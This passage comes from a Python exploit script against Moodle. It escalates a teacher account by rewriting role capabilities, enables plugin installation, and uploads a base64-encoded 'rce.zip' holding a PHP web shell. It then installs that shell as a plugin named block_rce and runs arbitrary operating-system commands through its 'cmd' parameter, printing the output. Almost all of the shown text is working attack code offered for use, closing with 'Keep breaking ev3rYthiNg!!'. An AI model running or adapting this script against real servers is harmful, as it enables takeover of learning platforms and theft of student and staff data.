ack:addinstance','1'),('block/globalsearch:addinstance','1'),('block/glossary_random:addinstance','1'),('block/html:addinstance','1'),('block/login:addinstance','1'),('block/mentees:addinstance','1'),('block/mnet_hosts:addinstance','1'),('block/myprofile:addinstance','1'),('block/navigation:addinstance','1'),('block/news_items:addinstance','1'),('block/online_users:addinstance','1'),('block/online_users:viewlist','1'),('block/private_files:addinstance','1'),('block/quiz_results:addinstance','1'),('block/recent_activity:addinstance','1'),('block/rss_client:addinstance','1'),('block/rss_client:manageanyfeeds','1'),('block/rss_client:manageownfeeds','1'),('block/search_forums:addinstance','1'),('block/section_links:addinstance','1'),('block/selfcompletion:addinstance','1'),('block/settings:addinstance','1'),('block/site_main_menu:addinstance','1'),('block/social_activities:addinstance','1'),('block/tag_flickr:addinstance','1'),('block/tag_youtube:addinstance','1'),('block/tags:addinstance','1'),('moodle/block:edit','1'),('moodle/block:view','1'),('moodle/site:manageblocks','1'),('savechanges','Save changes')]

    r = session.post(url + '/admin/roles/define.php', params=data_get, data=data_post)

    # Above we modify description field, so, if script find that description on site, we are good.
    if random_desc not in r.text:
        p6.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nTrouble updating fields\n")
        exit(1)
    else:
        r = session.get(url + '/admin/search.php')
        if "Install plugins" not in r.text:
            p6.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nModified fields but the options to install plugins have not been enabled.")
            print(Color.RED + "- (This is weird, sometimes he does it, sometimes he doesn't!!) Try again.\n")
            exit(1)

    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

    p6.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)

    return session, sess_key

def zipb64_up(session, url, sess_key, teacher_user, course_id):
    '''
    Doing upload of zip file as base64 binary data
        * https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/
    '''

    p7 = log.progress("Uploading malicious " + Color.BLUE + ".zip" + Color.END + " file")

    r = session.get(url + '/admin/tool/installaddon/index.php')
    zipfile_id = re.findall(r'name="zipfile" id="id_zipfile" value="(.*?)"', r.text)[0]
    client_id = re.findall(r'"client_id":"(.*?)"', r.text)[0]

    # Upupup
    data_get = {"action":"upload"}
    data_post = {
        "title" : "",
        "author" : teacher_user,
        "license" : "unknown",
        "itemid" : [zipfile_id, zipfile_id],
        "accepted_types[]" : [".zip",".zip"],
        "repo_id" : course_id,
        "p" : "",
        "page" : "",
        "env" : "filepicker",
        "sesskey" : sess_key,
        "client_id" : client_id,
        "maxbytes" : "-1",
        "areamaxbytes" : "-1",
        "ctx_id" : "1",
        "savepath" : "/"
    }

    zip_b64 = 'UEsDBAoAAAAAAOVa0VAAAAAAAAAAAAAAAAAEAAAAcmNlL1BLAwQKAAAAAACATtFQAAAAAAAAAAAAAAAACQAAAHJjZS9sYW5nL1BLAwQKAAAAAAB2bdFQAAAAAAAAAAAAAAAADAAAAHJjZS9sYW5nL2VuL1BLAwQUAAAACAD4W9FQA9MUliAAAAAeAAAAGQAAAHJjZS9sYW5nL2VuL2Jsb2NrX3JjZS5waHCzsS/IKFAoriwuSc3VUIl3dw2JVk/OTVGP1bRWsLcDAFBLAwQUAAAACAB6bdFQtXxvb0EAAABJAAAADwAAAHJjZS92ZXJzaW9uLnBocLOxL8goUODlUinIKU3PzNO1K0stKs7Mz1OwVTAyMDIwMDM0NzCwRpJPzs8tyM9LzSsBqlBPyslPzo4vSk5VtwYAUEsBAh8ACgAAAAAA5VrRUAAAAAAAAAAAAAAAAAQAJAAAAAAAAAAQAAAAAAAAAHJjZS8KACAAAAAAAAEAGAB/2bACX0TWAWRC9B9fRNYBhvTzH19E1gFQSwECHwAKAAAAAACATtFQAAAAAAAAAAAAAAAACQAkAAAAAAAAABAAAAAiAAAAcmNlL2xhbmcvCgAgAAAAAAABABgArE3mRVJE1gGOG/QfX0TWAYb08x9fRNYBUEsBAh8ACgAAAAAAdm3RUAAAAAAAAAAAAAAAAAwAJAAAAAAAAAAQAAAASQAAAHJjZS9sYW5nL2VuLwoAIAAAAAAAAQAYAMIcIaZyRNYBwhwhpnJE1gGOG/QfX0TWAVBLAQIfABQAAAAIAPhb0VAD0xSWIAAAAB4AAAAZACQAAAAAAAAAIAAAAHMAAAByY2UvbGFuZy9lbi9ibG9ja19yY2UucGhwCgAgAAAAAAABABgA1t0sN2BE1gHW3Sw3YETWAfYt6i9fRNYBUEsBAh8AFAAAAAgAem3RULV8b29BAAAASQAAAA8AJAAAAAAAAAAgAAAAygAAAHJjZS92ZXJzaW9uLnBocAoAIAAAAAAAAQAYAO6e2qlyRNYB7p7aqXJE1gFkQvQfX0TWAVBLBQYAAAAABQAFANsBAAA4AQAAAAA='
    zip_file_bytes = zip_b64.encode('utf-8')
    zip_file_b64 = base64.decodebytes(zip_file_bytes)

    data_file = [
        ('repo_upload_file',
            ('rce.zip', zip_file_b64, 'application/zip'))]

    r = session.post(url + '/repository/repository_ajax.php', params=data_get, data=data_post, files=data_file)
    if "rce.zip" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file.\n")
        exit(1)

    # Trying to load file
    data_post = {
        "sesskey" : sess_key,
        "_qf__tool_installaddon_installfromzip_form" : "1",
        "mform_showmore_id_general" : "0",
        "mform_isexpanded_id_general" : "1",
        "zipfile" : zipfile_id,
        "plugintype" : "",
        "rootdir" : "",
        "submitbutton" : "Install plugin from the ZIP file"
    }

    r = session.post(url + '/admin/tool/installaddon/index.php', data=data_post)
    if "Validation successful, installation can continue" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file, problems on plugin install.\n")
        exit(1)

    # Confirm load
    zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
    data_post = {
        "installzipcomponent" : "block_rce",
        "installzipstorage" : zip_storage,
        "installzipconfirm" : "1",
        "sesskey" : sess_key
    }

    r = session.post(url + '/admin/tool/installaddon/index.php', data=data_post)
    if "Current release information" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError uploading zip file, confirmation problems.\n")
        exit(1)

    p7.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)

    return session

def moodle_RCE(url, command):
    '''
    Remote Command Execution on system with plugin installed (malicious zip file)
    '''

    p8 = log.progress("Executing " + Color.BLUE + command + Color.END)
    time.sleep(1)

    data_get = {"cmd" : command}

    try:
        r = session.get(url + '/blocks/rce/lang/en/block_rce.php', params=data_get, timeout=3)
        p8.success(Color.YELLOW + "✓" + Color.END)
        time.sleep(1)
        print("\n" + Color.YELLOW + r.text + Color.END)
    except requests.exceptions.Timeout as e:
        p8.success(Color.YELLOW + "✓" + Color.END)
        time.sleep(1)
        pass

    print("[" + Color.YELLOW + "+" + Color.END + "]" + Color.GREEN + " Keep breaking ev3rYthiNg!!\n" + Color.END)

if __name__ == '__main__':
    args = arguments()
    session, id_user, sess_key = login(args.url, args.username, args.password, args.id_course, args.teacher_cookie)
    enrol2rce(session, args.url, args.id_manager, args.username, args.id_course, args.teacher_cookie, args.command)